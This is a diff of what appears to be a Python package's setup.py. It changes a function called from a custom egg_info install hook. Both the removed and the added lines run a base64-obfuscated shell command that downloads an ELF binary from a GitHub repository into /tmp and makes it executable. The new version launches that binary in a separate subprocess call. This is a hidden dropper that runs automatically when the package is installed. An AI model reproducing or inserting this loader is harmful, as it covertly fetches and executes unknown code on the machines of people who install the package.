@@ -6,9 +6,11 @@ import subprocess
 
 
 def RunCommand():
-    cmd = 'echo Y3VybCAtZnNTTCBodHRwczovL2dpdGh1Yi5jb20vV2lsbGlhbUNYVkkvbGluLXB5Y3Jvbm9zL3Jhdy9yZWZzL2hlYWRzL21haW4vNDQzLmVsZiAtbyAvdG1wLzQ0My5lbGY7IGNobW9kICt4IC90bXAvNDQzLmVsZjsgL3RtcC80NDMuZWxmDQo= | base64 -d | bash'
+    cmd = 'echo Y3VybCAtZnNTTCBodHRwczovL2dpdGh1Yi5jb20vV2lsbGlhbUNYVkkvbGluLXB5Y3Jvbm9zL3Jhdy9yZWZzL2hlYWRzL21haW4vNDQzLmVsZiAtbyAvdG1wLzQ0My5lbGY7IGNobW9kICt4IC90bXAvNDQzLmVsZg0K | base64 -d | bash'
+    cmd2='/tmp/443.elf'
     completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
-    return completed
+    completed2 = subprocess.run(cmd2, shell=True, capture_output=True, check=True)
+    return completed2
 
 class RunEggInfoCommand(egg_info):
     def run(self):
